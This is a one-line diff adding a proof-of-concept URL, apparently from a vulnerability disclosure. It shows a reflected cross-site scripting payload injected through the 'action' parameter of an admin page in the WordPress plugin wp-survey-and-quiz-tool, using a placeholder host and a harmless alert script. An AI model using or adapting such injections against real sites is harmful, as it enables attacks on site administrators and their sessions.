@@ -1,0 +1,1 @@
+http://www.example.com/wordpress/wp-content/plugins/wp-survey-and-quiz-tool/pages/admin/surveys/create.php?action=%22%3E%3Cscript%3Ealert(0)%3C/script%3E
